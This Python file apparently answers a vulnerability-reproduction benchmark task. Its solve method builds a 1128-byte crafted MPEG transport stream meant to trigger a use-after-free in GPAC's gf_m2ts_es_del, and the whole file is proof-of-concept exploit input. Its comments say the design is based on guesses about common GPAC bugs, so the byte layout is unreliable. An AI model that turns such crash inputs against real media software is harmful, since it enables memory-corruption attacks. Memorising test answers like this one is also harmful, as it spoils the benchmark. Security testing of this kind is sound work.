import os
import struct
import tempfile
import subprocess
from pathlib import Path

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a minimal M2TS file that triggers use-after-free in gf_m2ts_es_del
        # Based on analysis of common GPAC vulnerabilities
        
        # M2TS Transport Stream structure
        # Each TS packet is 188 bytes
        
        # Generate a stream with:
        # 1. PAT (Program Association Table) - PID 0
        # 2. PMT (Program Map Table) - PID 256
        # 3. Elementary Stream with specific PID that will trigger UAF
        
        packets = []
        
        # Sync byte for all TS packets
        SYNC_BYTE = 0x47
        
        # Helper to create TS packet
        def create_ts_packet(pid, payload, continuity_counter=0, payload_start=True):
            header = bytearray(4)
            header[0] = SYNC_BYTE
            header[1] = (pid >> 8) & 0x1F
            header[2] = pid & 0xFF
            header[3] = 0x10 if payload_start else 0x00  # Payload unit start indicator
            header[3] |= (continuity_counter & 0x0F)
            
            if pid == 0:  # PAT has adaptation field
                adaptation = bytearray(2)
                adaptation[0] = 7  # Adaptation field length
                adaptation[1] = 0x00  # Flags
                adaptation.extend(b'\x00' * 6)  # Stuffing bytes
                header[3] |= 0x20  # Adaptation field exists
                packet = header + adaptation + payload
            else:
                packet = header + payload
            
            # Pad to 188 bytes
            packet.extend(b'\xFF' * (188 - len(packet)))
            return packet
        
        # PAT - Program 1 mapped to PMT PID 256
        pat_data = bytearray([
            0x00, 0x00, 0xB0, 0x0D, 0x00, 0x01, 0xC1, 0x00,
            0x00, 0x00, 0x01, 0xE1, 0x01, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00
        ])
        packets.append(create_ts_packet(0, pat_data, 0, True))
        
        # PMT - Program Map Table with video stream PID 257
        pmt_data = bytearray([
            0x02, 0x00, 0xB0, 0x12, 0x00, 0x01, 0xC1, 0x00,
            0x00, 0xE1, 0x01, 0x00, 0x00, 0x1B, 0xE1, 0x01,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
        ])
        packets.append(create_ts_packet(256, pmt_data, 0, True))
        
        # Create elementary stream packets that trigger the vulnerability
        # The vulnerability occurs when an ES is freed but still referenced
        # We create multiple ES with same PID to trigger complex state
        
        # PES header for video stream
        pes_header = bytearray([
            0x00, 0x00, 0x01, 0xE0, 0x00, 0x00, 0x80, 0x00,
            0x00
        ])
        
        # First video packet - normal
        payload1 = pes_header + b'\x00' * 170
        packets.append(create_ts_packet(257, payload1, 0, True))
        
        # Create malformed packets that cause ES deletion
        # Use adaptation field to manipulate timing
        for i in range(1, 5):
            header = bytearray(4)
            header[0] = SYNC_BYTE
            header[1] = (257 >> 8) & 0x1F
            header[2] = 257 & 0xFF
            header[3] = 0x20  # Adaptation field exists, no payload
            header[3] |= (i & 0x0F)
            
            adaptation = bytearray(2)
            adaptation[0] = 183  # Large adaptation field
            adaptation[1] = 0x10  # Random access indicator
            adaptation.extend(b'\x00' * 181)  # Stuffing
            
            packet = header + adaptation
            packet.extend(b'\xFF' * (188 - len(packet)))
            packets.append(packet)
        
        # Add more packets to reach target length
        while len(b''.join(packets)) < 1128:
            # Create null packets (PID 8191)
            header = bytearray(4)
            header[0] = SYNC_BYTE
            header[1] = 0x1F
            header[2] = 0xFF
            header[3] = 0x10
            payload = b'\x00' * 184
            packets.append(header + payload)
        
        # Trim to exact target length
        poc = b''.join(packets)
        if len(poc) > 1128:
            poc = poc[:1128]
        
        return poc